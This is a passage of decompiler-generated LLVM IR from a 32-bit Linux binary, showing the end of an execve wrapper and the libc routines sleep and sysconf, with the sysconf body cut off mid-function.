  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80546f0 = load i32, i32* @ebx, align 4
  store i32 %v0_80546f0, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80546f3 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80546f3, i32* %eax.global-to-local, align 4
  %v12_80546f6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80546fc

dec_label_pc_80546fc:                             ; preds = %dec_label_pc_80546fc, %entry
  %v0_80546ff = phi i32 [ 0, %entry ], [ %v1_80546ff, %dec_label_pc_80546fc ]
  %stack_var_-16.0 = phi i32 [ %v2_80546f3, %entry ], [ %v1_8054700, %dec_label_pc_80546fc ]
  %v1_80546ff = add i32 %v0_80546ff, 1
  store i32 %v1_80546ff, i32* %esi.global-to-local, align 4
  %v1_8054700 = add i32 %stack_var_-16.0, 4
  store i32 %v1_8054700, i32* %eax.global-to-local, align 4
  %v1_8054706 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8054706 = load i32, i32* %v1_8054706, align 4
  %v3_8054706 = icmp eq i32 %v2_8054706, 0
  %v1_8054709 = icmp eq i1 %v3_8054706, false
  br i1 %v1_8054709, label %dec_label_pc_80546fc, label %dec_label_pc_805470b

dec_label_pc_805470b:                             ; preds = %dec_label_pc_80546fc
  %v1_805470b = mul i32 %v1_80546ff, 4
  %v2_805470b = add i32 %v1_805470b, 34
  %v1_8054712 = and i32 %v2_805470b, -16
  %v2_8054715 = sub i32 %v12_80546f6, %v1_8054712
  %v1_805471a = add i32 %v2_8054715, 15
  %v1_805471e = and i32 %v1_805471a, -16
  store i32 %v1_805471e, i32* @ebx, align 4
  store i32 %v1_805471e, i32* %ecx.global-to-local, align 4
  %v2_8054723 = inttoptr i32 %v1_805471e to i32*
  store i32 %arg2, i32* %v2_8054723, align 16
  store i32 %v2_80546f3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805472b

dec_label_pc_805472b:                             ; preds = %dec_label_pc_805472b, %dec_label_pc_805470b
  %stack_var_-16.1 = phi i32 [ %v2_80546f3, %dec_label_pc_805470b ], [ %v1_8054732, %dec_label_pc_805472b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_805472e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805472e = add i32 %v0_805472e, 4
  store i32 %v1_805472e, i32* %ecx.global-to-local, align 4
  %v0_8054731 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054731 = add i32 %v0_8054731, -1
  %v8_8054731 = icmp eq i32 %v1_8054731, 0
  store i32 %v1_8054731, i32* %esi.global-to-local, align 4
  %v1_8054732 = add i32 %stack_var_-16.1, 4
  %v1_8054738 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8054738 = load i32, i32* %v1_8054738, align 4
  store i32 %v2_8054738, i32* %eax.global-to-local, align 4
  %v2_805473a = inttoptr i32 %v1_805472e to i32*
  store i32 %v2_8054738, i32* %v2_805473a, align 4
  %v1_805473c = icmp eq i1 %v8_8054731, false
  br i1 %v1_805473c, label %dec_label_pc_805472b, label %dec_label_pc_805473e

dec_label_pc_805473e:                             ; preds = %dec_label_pc_805472b
  %v0_805473e = load i32, i32* %eax.global-to-local, align 4
  %v1_805473e = load i32, i32* @esp, align 4
  %v2_805473e = add i32 %v1_805473e, -4
  %v3_805473e = inttoptr i32 %v2_805473e to i32*
  store i32 %v0_805473e, i32* %v3_805473e, align 4
  %v0_805473f = load i32, i32* @global_var_80636cc.557, align 4
  %v2_805473f = add i32 %v1_805473e, -8
  %v3_805473f = inttoptr i32 %v2_805473f to i32*
  store i32 %v0_805473f, i32* %v3_805473f, align 4
  %v0_8054745 = load i32, i32* @ebx, align 4
  %v2_8054745 = add i32 %v1_805473e, -12
  %v3_8054745 = inttoptr i32 %v2_8054745 to i32*
  store i32 %v0_8054745, i32* %v3_8054745, align 4
  %v5_8054746 = add i32 %v1_805473e, -16
  %v6_8054746 = inttoptr i32 %v5_8054746 to i32*
  store i32 %arg1, i32* %v6_8054746, align 4
  %v1_8054749 = inttoptr i32 %v1_8054732 to i8*
  %v2_8054749 = call i32 @__GI_execve(i8* %v1_8054749)
  store i32 %v2_8054749, i32* %eax.global-to-local, align 4
  %v2_8054751 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054751, i32* @ebx, align 4
  ret i32 %v2_8054749

; uselistorder directives
  uselistorder i32 %v1_8054731, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_8054700, { 1, 0 }
  uselistorder i32 %v1_80546ff, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80546f3, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8054758 = load i32, i32* @ebp, align 4
  %v0_8054759 = load i32, i32* @edi, align 4
  %v0_805475a = load i32, i32* @esi, align 4
  %v0_805475b = load i32, i32* @ebx, align 4
  %v15_805475c = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_805476e = icmp eq i32 %arg1, 0
  %v1_8054770 = icmp eq i1 %v1_805476e, false
  br i1 %v1_8054770, label %dec_label_pc_8054782.preheader, label %dec_label_pc_80548cf

dec_label_pc_8054782.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054777

dec_label_pc_8054777:                             ; preds = %dec_label_pc_8054777.dec_label_pc_8054777_crit_edge, %dec_label_pc_8054782.preheader
  %v0_8054777 = phi i32 [ %v15_805475c, %dec_label_pc_8054782.preheader ], [ %v0_8054777.pre, %dec_label_pc_8054777.dec_label_pc_8054777_crit_edge ]
  %v1_805478229 = phi i32 [ 31, %dec_label_pc_8054782.preheader ], [ %v1_8054782, %dec_label_pc_8054777.dec_label_pc_8054777_crit_edge ]
  %v2_8054777 = mul i32 %v1_805478229, 4
  %v3_8054777 = add i32 %v2_8054777, 292
  %v4_8054777 = add i32 %v3_8054777, %v0_8054777
  %v5_8054777 = inttoptr i32 %v4_8054777 to i32*
  store i32 0, i32* %v5_8054777, align 4
  %v0_8054782.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054782 = add i32 %v0_8054782.pre, -1
  %v9_8054782 = icmp slt i32 %v1_8054782, 0
  store i32 %v1_8054782, i32* %eax.global-to-local, align 4
  %v1_8054783 = icmp eq i1 %v9_8054782, false
  br i1 %v1_8054783, label %dec_label_pc_8054777.dec_label_pc_8054777_crit_edge, label %dec_label_pc_8054785

dec_label_pc_8054777.dec_label_pc_8054777_crit_edge: ; preds = %dec_label_pc_8054777
  %v0_8054777.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054777

dec_label_pc_8054785:                             ; preds = %dec_label_pc_8054777
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805479b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805479b, i32* @ebx, align 4
  store i32 %v2_805479b, i32* %stack_var_-460, align 4
  %v4_80547a3 = call i32 @__sigaddset(i32 %v2_805479b, i32 17, i32 %v1_8054782, i32 %v1_8054782)
  store i32 %v4_80547a3, i32* %eax.global-to-local, align 4
  %v2_80547ab = icmp slt i32 %v4_80547a3, 0
  br i1 %v2_80547ab, label %dec_label_pc_80548d3, label %dec_label_pc_80547b3

dec_label_pc_80547b3:                             ; preds = %dec_label_pc_8054785
  %v2_80547b4 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80547b4, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80547bf = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80547bf = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80547bf, i32 %v2_80547b4)
  store i32 %v4_80547bf, i32* %eax.global-to-local, align 4
  %v1_80547c7 = icmp eq i32 %v4_80547bf, 0
  %v1_80547c9 = icmp eq i1 %v1_80547c7, false
  br i1 %v1_80547c9, label %dec_label_pc_80548d3, label %dec_label_pc_80547cf

dec_label_pc_80547cf:                             ; preds = %dec_label_pc_80547b3
  store i32 %v2_80547b4, i32* %stack_var_-460, align 4
  %v4_80547d4 = call i32 @__sigismember(i32 %v2_80547b4, i32 17, i32 %v4_80547bf, i32 %v4_80547bf)
  store i32 %v4_80547d4, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80547e1 = icmp eq i32 %v4_80547d4, 0
  br i1 %v1_80547e1, label %dec_label_pc_80547f5.preheader, label %dec_label_pc_805489d

dec_label_pc_80547f5.preheader:                   ; preds = %dec_label_pc_80547cf
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80547ea

dec_label_pc_80547ea:                             ; preds = %dec_label_pc_80547ea.dec_label_pc_80547ea_crit_edge, %dec_label_pc_80547f5.preheader
  %v0_80547ea = phi i32 [ %v15_805475c, %dec_label_pc_80547f5.preheader ], [ %v0_80547ea.pre, %dec_label_pc_80547ea.dec_label_pc_80547ea_crit_edge ]
  %v1_80547f528 = phi i32 [ 31, %dec_label_pc_80547f5.preheader ], [ %v1_80547f5, %dec_label_pc_80547ea.dec_label_pc_80547ea_crit_edge ]
  %v2_80547ea = mul i32 %v1_80547f528, 4
  %v3_80547ea = add i32 %v2_80547ea, 292
  %v4_80547ea = add i32 %v3_80547ea, %v0_80547ea
  %v5_80547ea = inttoptr i32 %v4_80547ea to i32*
  store i32 0, i32* %v5_80547ea, align 4
  %v0_80547f5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80547f5 = add i32 %v0_80547f5.pre, -1
  %v9_80547f5 = icmp slt i32 %v1_80547f5, 0
  store i32 %v1_80547f5, i32* %edx.global-to-local, align 4
  %v1_80547f6 = icmp eq i1 %v9_80547f5, false
  br i1 %v1_80547f6, label %dec_label_pc_80547ea.dec_label_pc_80547ea_crit_edge, label %dec_label_pc_80547f8

dec_label_pc_80547ea.dec_label_pc_80547ea_crit_edge: ; preds = %dec_label_pc_80547ea
  %v0_80547ea.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80547ea

dec_label_pc_80547f8:                             ; preds = %dec_label_pc_80547ea
  store i32 %v2_805479b, i32* %eax.global-to-local, align 4
  store i32 %v2_805479b, i32* %stack_var_-460, align 4
  %v4_8054804 = call i32 @__sigaddset(i32 %v2_805479b, i32 17, i32 0, i32 0)
  store i32 %v4_8054804, i32* %eax.global-to-local, align 4
  %v2_805480c = icmp slt i32 %v4_8054804, 0
  br i1 %v2_805480c, label %dec_label_pc_80548d3, label %dec_label_pc_8054814

dec_label_pc_8054814:                             ; preds = %dec_label_pc_80547f8
  %v2_8054815 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8054815, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_805481e = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8054815)
  store i32 %v4_805481e, i32* %eax.global-to-local, align 4
  %v2_8054826 = icmp slt i32 %v4_805481e, 0
  %v1_8054828 = icmp eq i1 %v2_8054826, false
  br i1 %v1_8054828, label %dec_label_pc_8054852, label %dec_label_pc_805482a

dec_label_pc_805482a:                             ; preds = %dec_label_pc_8054814
  %v0_805482a = load i32, i32* %stack_var_-460, align 4
  %v1_805482a = call i32 @__errno_location(i32 %v0_805482a)
  store i32 %v1_805482a, i32* %eax.global-to-local, align 4
  store i32 %v1_805482a, i32* @ebx, align 4
  %v1_8054831 = inttoptr i32 %v1_805482a to i32*
  %v2_8054831 = load i32, i32* %v1_8054831, align 4
  store i32 %v2_8054831, i32* @esi, align 4
  store i32 %v2_80547b4, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054840 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054840 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054840, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805484b = load i32, i32* @esi, align 4
  %v1_805484b = load i32, i32* @ebx, align 4
  %v2_805484b = inttoptr i32 %v1_805484b to i32*
  store i32 %v0_805484b, i32* %v2_805484b, align 4
  %v0_80548e0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548d6

dec_label_pc_8054852:                             ; preds = %dec_label_pc_8054814
  %v3_8054852 = load i32, i32* %stack_var_-420, align 4
  %v12_8054852 = icmp eq i32 %v3_8054852, 1
  %v2_805485e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805485e, i32* @ebx, align 4
  %v1_8054865 = icmp eq i1 %v12_8054852, false
  br i1 %v1_8054865, label %dec_label_pc_805488c, label %dec_label_pc_8054867

dec_label_pc_8054867:                             ; preds = %dec_label_pc_8054852
  %v0_8054867 = load i32, i32* @edi, align 4
  store i32 %v2_805485e, i32* %stack_var_-460, align 4
  %v4_805486b = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805486b = call i32 @__libc_nanosleep(%timespec* %v4_805486b, i32 %v2_805485e, i32 %v0_8054867, i32 %v0_8054867)
  store i32 %v5_805486b, i32* %eax.global-to-local, align 4
  store i32 %v5_805486b, i32* @edi, align 4
  %v1_8054872 = call i32 @__errno_location(i32 %v2_805485e)
  store i32 %v1_8054872, i32* %eax.global-to-local, align 4
  store i32 %v1_8054872, i32* @ebx, align 4
  %v1_805487c = inttoptr i32 %v1_8054872 to i32*
  %v2_805487c = load i32, i32* %v1_805487c, align 4
  store i32 %v2_805487c, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054883 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054883 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054883, i32 0)
  store i32 %v4_8054883, i32* %eax.global-to-local, align 4
  %v0_8054888 = load i32, i32* @esi, align 4
  %v1_8054888 = load i32, i32* @ebx, align 4
  %v2_8054888 = inttoptr i32 %v1_8054888 to i32*
  store i32 %v0_8054888, i32* %v2_8054888, align 4
  %v0_80548b2.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80548af

dec_label_pc_805488c:                             ; preds = %dec_label_pc_8054852
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054892 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054892 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054892, i32 0)
  store i32 %v4_8054892, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80548a8

dec_label_pc_805489d:                             ; preds = %dec_label_pc_80547cf
  %v2_805489f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805489f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548a8

dec_label_pc_80548a8:                             ; preds = %dec_label_pc_805488c, %dec_label_pc_805489d
  %storemerge3.pre-phi = phi i32 [ %v2_805485e, %dec_label_pc_805488c ], [ %v2_805489f, %dec_label_pc_805489d ]
  %v3_80548a8 = phi i32 [ %v2_80547b4, %dec_label_pc_805488c ], [ %v4_80547d4, %dec_label_pc_805489d ]
  %v2_80548a8 = phi i32 [ 0, %dec_label_pc_805488c ], [ %v4_80547d4, %dec_label_pc_805489d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_80548a8 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_80548a8 = call i32 @__libc_nanosleep(%timespec* %v4_80548a8, i32 %storemerge3.pre-phi, i32 %v2_80548a8, i32 %v3_80548a8)
  store i32 %v5_80548a8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548af

dec_label_pc_80548af:                             ; preds = %dec_label_pc_8054867, %dec_label_pc_80548a8
  %v0_80548b2 = phi i32 [ %v0_80548b2.pre, %dec_label_pc_8054867 ], [ %v5_80548a8, %dec_label_pc_80548a8 ]
  %v1_80548b2 = icmp eq i32 %v0_80548b2, 0
  br i1 %v1_80548b2, label %dec_label_pc_80548cf, label %dec_label_pc_80548b6

dec_label_pc_80548b6:                             ; preds = %dec_label_pc_80548af
  %v4_80548c6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80548c6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548d6

dec_label_pc_80548cf:                             ; preds = %entry, %dec_label_pc_80548af
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548d6

dec_label_pc_80548d3:                             ; preds = %dec_label_pc_80547f8, %dec_label_pc_80547b3, %dec_label_pc_8054785
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548d6

dec_label_pc_80548d6:                             ; preds = %dec_label_pc_80548cf, %dec_label_pc_80548b6, %dec_label_pc_805482a, %dec_label_pc_80548d3
  %v0_80548e0 = phi i32 [ 0, %dec_label_pc_80548cf ], [ %v4_80548c6, %dec_label_pc_80548b6 ], [ %v0_80548e0.pre, %dec_label_pc_805482a ], [ -1, %dec_label_pc_80548d3 ]
  store i32 %v0_805475b, i32* @ebx, align 4
  store i32 %v0_805475a, i32* @esi, align 4
  store i32 %v0_8054759, i32* @edi, align 4
  store i32 %v0_8054758, i32* @ebp, align 4
  ret i32 %v0_80548e0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8054872, { 1, 0, 2 }
  uselistorder i32 %v2_805485e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80547f5, { 2, 1, 0 }
  uselistorder i32 %v4_80547d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80547b4, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_805479b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8054782, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80548d6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80548cf, { 1, 0 }
  uselistorder label %dec_label_pc_80548af, { 1, 0 }
  uselistorder label %dec_label_pc_80548a8, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_8054903 [
    i32 0, label %dec_label_pc_8054913
    i32 1, label %dec_label_pc_80549f8
    i32 2, label %dec_label_pc_805491d
    i32 3, label %dec_label_pc_8054927
    i32 4, label %dec_label_pc_8054931
    i32 5, label %dec_label_pc_80549c7
    i32 6, label %dec_label_pc_8054939
    i32 7, label %dec_label_pc_80548f9
    i32 8, label %dec_label_pc_80548f9
    i32 9, label %dec_label_pc_80548f9
    i32 10, label %dec_label_pc_80548f9
    i32 11, label %dec_label_pc_80548f9
    i32 12, label %dec_label_pc_80548f9
    i32 13, label %dec_label_pc_80548f9
    i32 14, label %dec_label_pc_80548f9
    i32 15, label %dec_label_pc_80548f9
    i32 16, label %dec_label_pc_80548f9
    i32 17, label %dec_label_pc_80548f9
    i32 18, label %dec_label_pc_80548f9
    i32 19, label %dec_label_pc_80548f9
    i32 20, label %dec_label_pc_80548f9
    i32 21, label %dec_label_pc_80548f9
    i32 22, label %dec_label_pc_80548f9
    i32 23, label %dec_label_pc_80549f8
    i32 24, label %dec_label_pc_80549f8
    i32 25, label %dec_label_pc_8054a04
    i32 26, label %dec_label_pc_80549d5
    i32 27, label %dec_label_pc_80549f8
    i32 28, label %dec_label_pc_805494b
    i32 29, label %dec_label_pc_80549ce
    i32 30, label %dec_label_pc_8054943
    i32 31, label %dec_label_pc_80549e3
    i32 32, label %dec_label_pc_80549f8
    i32 33, label %dec_label_pc_80549f8
    i32 34, label %dec_label_pc_80549f8
    i32 35, label %dec_label_pc_80549dc
    i32 36, label %dec_label_pc_8054a0b
    i32 37, label %dec_label_pc_8054a12
    i32 38, label %dec_label_pc_8054a0b
    i32 39, label %dec_label_pc_8054955
    i32 40, label %dec_label_pc_8054a19
    i32 41, label %dec_label_pc_80549f8
    i32 42, label %dec_label_pc_80549e3
    i32 43, label %dec_label_pc_8054a12
    i32 44, label %dec_label_pc_8054a20
    i32 45, label %dec_label_pc_8054a12
    i32 46, label %dec_label_pc_80549ce
    i32 47, label %dec_label_pc_80549ce
    i32 48, label %dec_label_pc_80549ce
    i32 49, label %dec_label_pc_80549f8
    i32 50, label %dec_label_pc_80549f8
    i32 51, label %dec_label_pc_80549ce
    i32 52, label %dec_label_pc_80549ce
    i32 53, label %dec_label_pc_80549f8
    i32 54, label %dec_label_pc_80549f8
    i32 55, label %dec_label_pc_80549f8
    i32 56, label %dec_label_pc_80549f8
    i32 57, label %dec_label_pc_80549f8
    i32 58, label %dec_label_pc_80549f8
    i32 59, label %dec_label_pc_80549f8
    i32 60, label %dec_label_pc_80549f8
    i32 61, label %dec_label_pc_80549f8
    i32 62, label %dec_label_pc_80549f8
    i32 63, label %dec_label_pc_80549f8
    i32 64, label %dec_label_pc_80549f8
    i32 65, label %dec_label_pc_80549f8
    i32 66, label %dec_label_pc_80549f8
    i32 67, label %dec_label_pc_80548f9
    i32 68, label %dec_label_pc_80548f9
    i32 69, label %dec_label_pc_80549dc
    i32 70, label %dec_label_pc_80549dc
    i32 71, label %dec_label_pc_80549dc
    i32 72, label %dec_label_pc_80549e3
    i32 73, label %dec_label_pc_80549ea
    i32 74, label %dec_label_pc_80549f1
    i32 75, label %dec_label_pc_805495f
    i32 76, label %dec_label_pc_80549f1
    i32 77, label %dec_label_pc_80548f9
    i32 78, label %dec_label_pc_80548f9
    i32 79, label %dec_label_pc_80548f9
    i32 80, label %dec_label_pc_80548f9
    i32 81, label %dec_label_pc_80548f9
    i32 82, label %dec_label_pc_80548f9
    i32 83, label %dec_label_pc_80548f9
    i32 84, label %dec_label_pc_80548f9
    i32 85, label %dec_label_pc_80549f8
    i32 86, label %dec_label_pc_80549f8
    i32 87, label %dec_label_pc_80549d5
    i32 88, label %dec_label_pc_8054969
    i32 89, label %dec_label_pc_8054973
    i32 90, label %dec_label_pc_80549ea
    i32 91, label %dec_label_pc_80548f9
    i32 92, label %dec_label_pc_80548f9
    i32 93, label %dec_label_pc_80548f9
    i32 94, label %dec_label_pc_80548f9
    i32 95, label %dec_label_pc_80549ce
    i32 96, label %dec_label_pc_80549f8
    i32 97, label %dec_label_pc_80549f8
    i32 98, label %dec_label_pc_80548f9
    i32 99, label %dec_label_pc_80548f9
    i32 100, label %dec_label_pc_80548f9
    i32 101, label %dec_label_pc_805497d
    i32 102, label %dec_label_pc_80549c0
    i32 103, label %dec_label_pc_80549fd
    i32 104, label %dec_label_pc_80549d5
    i32 105, label %dec_label_pc_8054987
    i32 106, label %dec_label_pc_80549e3
    i32 107, label %dec_label_pc_80549e3
    i32 108, label %dec_label_pc_80549c7
    i32 109, label %dec_label_pc_8054a04
    i32 110, label %dec_label_pc_8054a20
    i32 111, label %dec_label_pc_80549c0
    i32 112, label %dec_label_pc_80549fd
    i32 113, label %dec_label_pc_8054a20
    i32 114, label %dec_label_pc_8054991
    i32 115, label %dec_label_pc_8054a19
    i32 116, label %dec_label_pc_80549f8
    i32 117, label %dec_label_pc_80549f8
    i32 118, label %dec_label_pc_805499b
    i32 119, label %dec_label_pc_80549a5
    i32 120, label %dec_label_pc_8054a12
    i32 121, label %dec_label_pc_80549d5
    i32 122, label %dec_label_pc_80549d5
    i32 123, label %dec_label_pc_80549d5
    i32 124, label %dec_label_pc_80549d5
    i32 125, label %dec_label_pc_80548f9
    i32 126, label %dec_label_pc_80548f9
    i32 127, label %dec_label_pc_80549f8
    i32 128, label %dec_label_pc_80549f8
    i32 129, label %dec_label_pc_80548f9
    i32 130, label %dec_label_pc_80548f9
    i32 131, label %dec_label_pc_80549f8
    i32 149, label %dec_label_pc_80549ac
  ]

dec_label_pc_80548f9:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054903:                             ; preds = %entry
  %v1_8054903 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8054908 = inttoptr i32 %v1_8054903 to i32*
  store i32 22, i32* %v1_8054908, align 4
  br label %dec_label_pc_80549f8

dec_label_pc_8054913:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_805491d:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054927:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054931:                             ; preds = %entry
  %v1_8054934 = call i32 @getdtablesize(i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8054939

dec_label_pc_8054939:                             ; preds = %entry, %dec_label_pc_8054931
  br label %dec_label_pc_8054a25

dec_label_pc_8054943:                             ; preds = %entry
  %v0_8054946 = call i32 @__GI_getpagesize()
  br label %dec_label_pc_805494b

dec_label_pc_805494b:                             ; preds = %entry, %dec_label_pc_8054943
  br label %dec_label_pc_8054a25

dec_label_pc_8054955:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_805495f:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054969:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054973:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_805497d:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054987:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054991:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_805499b:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549a5:                             ; preds = %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549ac:                             ; preds = %entry
  %v5_80549b2 = call i32 @__GI_clock_getres(i32 1, %timespec* null, i32 149, i32 149)
  %v2_80549ba = icmp slt i32 %v5_80549b2, 0
  %v1_80549bc = icmp eq i1 %v2_80549ba, false
  br i1 %v1_80549bc, label %dec_label_pc_80549ce, label %dec_label_pc_80549f8

dec_label_pc_80549c0:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549c7:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549ce:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_80549ac
  br label %dec_label_pc_8054a25

dec_label_pc_80549d5:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549dc:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549e3:                             ; preds = %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549ea:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549f1:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_80549f8:                             ; preds = %dec_label_pc_80549ac, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %dec_label_pc_8054903
  br label %dec_label_pc_8054a25

dec_label_pc_80549fd:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054a04:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054a0b:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054a12:                             ; preds = %entry, %entry, %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054a19:                             ; preds = %entry, %entry
  br label %dec_label_pc_8054a25

dec_label_pc_8054a20:                             ; preds = %entry, %entry, %entry
  br label %dec_label_pc_8054a25

